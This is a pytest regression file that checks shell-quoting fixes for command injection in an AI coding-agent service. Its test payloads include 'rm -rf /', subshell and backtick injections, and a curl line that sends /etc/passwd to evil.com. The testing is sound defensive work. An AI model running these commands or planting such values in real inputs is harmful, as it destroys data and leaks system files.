"""Regression tests for GAP-0089 / GAP-0090 — shell-command injection in
``app/services/agent_coder.py``.

Offline / no AWS / no command execution: exercises the pure command-builder
functions directly. (GAP-0079, covered separately, already hardened the
``clone_repo`` command in the same file.)

GAP-0089: ``build_coder_workflow`` f-stringed ``prompt[:200]`` — which embeds
the user-controlled ticket subject — into a double-quoted shell argument of the
coding command (``claude ... -p "..."`` / ``codex -q "..."``). A subject with
``"``, ``$()``, backticks, or ``&&`` broke out of the quotes.

GAP-0090: ``build_pr_command`` used ``.replace('"', "'")`` (not a shell escape)
for the ``gh pr create`` ``--title``/``--body`` args; ``$()``/backticks/single
quotes survived it, and ``--base``/``--head`` were interpolated unquoted.

Fails-before / passes-after: with a payload like ``"; rm -rf / #`` / ``$()`` /
backticks in the ticket subject, branch, base, or title, the resulting command
must tokenize (``shlex.split``) such that the payload is a single inert shell
token — i.e. the attacker fragment is not parsed as separate commands/operators.
"""

import shlex

import pytest

from app.services.agent_coder import build_coder_workflow, build_pr_command

# Payloads that, if not properly quoted, would break out of the shell arg and
# inject extra commands / operators.
_PAYLOADS = [
    'foo"; rm -rf / #',
    "foo'; rm -rf / #",
    "foo $(rm -rf /)",
    "foo `id`",
    'bug" && curl https://evil.com/$(cat /etc/passwd) && echo "x',
]

_CFG = {
    "repo_url": "https://github.com/org/repo",
    "test_commands": ["pytest"],
}


def _coding_cmd(ticket, *, coding_tool="claude_code"):
    cfg = dict(_CFG, coding_tool=coding_tool)
    wf = build_coder_workflow(agent_run_id="r1", config=cfg, ticket=ticket)
    step = next(s for s in wf["steps"] if s["type"] == "inject_coding_prompt")
    return step["command"]


def _assert_no_injection(cmd: str, marker: str = "rm -rf /") -> None:
    """The command must parse with shlex (balanced quoting) and must not expose
    the injection payload as a standalone token / shell operator."""
    tokens = shlex.split(cmd)  # raises ValueError on unbalanced quotes
    # The injected destructive fragment must live *inside* a single quoted token,
    # never as its own argv element or shell operator.
    assert marker not in tokens, f"'{marker}' became a standalone token in: {cmd!r}"
    for op in ("&&", "||", ";", "|", "$(rm", "`id`"):
        assert op not in tokens, f"shell operator {op!r} leaked as a token in: {cmd!r}"


# --- GAP-0089: coding command ----------------------------------------------


@pytest.mark.parametrize("payload", _PAYLOADS)
@pytest.mark.parametrize("coding_tool", ["claude_code", "codex"])
def test_coding_cmd_subject_injection_neutralised(payload, coding_tool):
    cmd = _coding_cmd({"ticket_id": "T-1", "subject": payload}, coding_tool=coding_tool)
    _assert_no_injection(cmd)


def test_coding_cmd_safe_subject_preserved():
    cmd = _coding_cmd({"ticket_id": "T-1", "subject": "Fix login bug"})
    assert "Fix login bug" in cmd
    # Single shell token after the -p flag carries the prompt.
    tokens = shlex.split(cmd)
    assert tokens[0] == "claude"
    assert "-p" in tokens


def test_coding_cmd_model_flag_quoted():
    cfg = dict(_CFG, coding_tool_model='evil"; rm -rf / #')
    wf = build_coder_workflow(
        agent_run_id="r1", config=cfg, ticket={"ticket_id": "T-1", "subject": "ok"}
    )
    step = next(s for s in wf["steps"] if s["type"] == "inject_coding_prompt")
    _assert_no_injection(step["command"])


# --- GAP-0090: PR command ---------------------------------------------------


def _pr_cmd(*, subject="Fix bug", base="main", branch="feat/t-1"):
    return build_pr_command(
        branch_name=branch,
        base_branch=base,
        ticket_id="T-1",
        ticket_subject=subject,
        template="Closes #{ticket_id}\n\n{summary}",
        summary="summary",
    )


@pytest.mark.parametrize("payload", _PAYLOADS)
def test_pr_cmd_subject_injection_neutralised(payload):
    _assert_no_injection(_pr_cmd(subject=payload))


def test_pr_cmd_branch_injection_neutralised():
    _assert_no_injection(_pr_cmd(branch='feat/t-1"; rm -rf / #'))


def test_pr_cmd_base_injection_neutralised():
    _assert_no_injection(_pr_cmd(base="main; rm -rf / #"))


def test_pr_cmd_subshell_not_unquoted():
    cmd = _pr_cmd(subject="Fix $(cat /etc/passwd) bug")
    # The whole subject (including the $() ) must be a single shell token; the
    # subshell must not be parsed as a separate argv element / command.
    tokens = shlex.split(cmd)
    assert "Fix $(cat /etc/passwd) bug" in tokens, cmd
    _assert_no_injection(cmd, marker="cat")


def test_pr_cmd_safe_subject_preserved():
    cmd = _pr_cmd(subject="Fix login bug")
    assert "Fix login bug" in cmd
    tokens = shlex.split(cmd)
    assert tokens[:2] == ["gh", "pr"]
    assert "Fix login bug" in tokens  # single quoted token
